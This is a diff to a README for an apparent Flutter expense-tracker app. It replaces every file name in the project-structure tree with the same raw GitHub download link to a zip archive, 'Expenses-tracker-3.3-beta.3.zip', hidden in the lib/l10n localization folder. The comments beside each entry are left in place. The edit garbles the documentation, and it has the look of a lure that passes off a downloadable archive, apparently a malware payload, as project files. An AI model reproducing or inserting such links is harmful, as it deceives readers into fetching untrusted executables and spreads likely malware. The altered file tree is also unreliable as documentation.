@@ -78,16 +78,16 @@ The app includes the following expense categories:
 ```
 lib/
 ├── models/
-│   └── expense.dart          # Expense data model
+│   └── https://github.com/hamadoun1760/Expenses-tracker/raw/refs/heads/main/lib/l10n/Expenses-tracker-3.3-beta.3.zip          # Expense data model
 ├── helpers/
-│   └── database_helper.dart  # SQLite database operations
+│   └── https://github.com/hamadoun1760/Expenses-tracker/raw/refs/heads/main/lib/l10n/Expenses-tracker-3.3-beta.3.zip  # SQLite database operations
 ├── screens/
-│   ├── expense_list_screen.dart     # Main expense list
-│   ├── add_edit_expense_screen.dart # Add/edit expense form
-│   └── statistics_screen.dart       # Statistics dashboard
+│   ├── https://github.com/hamadoun1760/Expenses-tracker/raw/refs/heads/main/lib/l10n/Expenses-tracker-3.3-beta.3.zip     # Main expense list
+│   ├── https://github.com/hamadoun1760/Expenses-tracker/raw/refs/heads/main/lib/l10n/Expenses-tracker-3.3-beta.3.zip # Add/edit expense form
+│   └── https://github.com/hamadoun1760/Expenses-tracker/raw/refs/heads/main/lib/l10n/Expenses-tracker-3.3-beta.3.zip       # Statistics dashboard
 ├── utils/
-│   └── theme.dart           # App theme and styling
-└── main.dart               # App entry point
+│   └── https://github.com/hamadoun1760/Expenses-tracker/raw/refs/heads/main/lib/l10n/Expenses-tracker-3.3-beta.3.zip           # App theme and styling
+└── https://github.com/hamadoun1760/Expenses-tracker/raw/refs/heads/main/lib/l10n/Expenses-tracker-3.3-beta.3.zip               # App entry point
 ```
 
 ## Usage
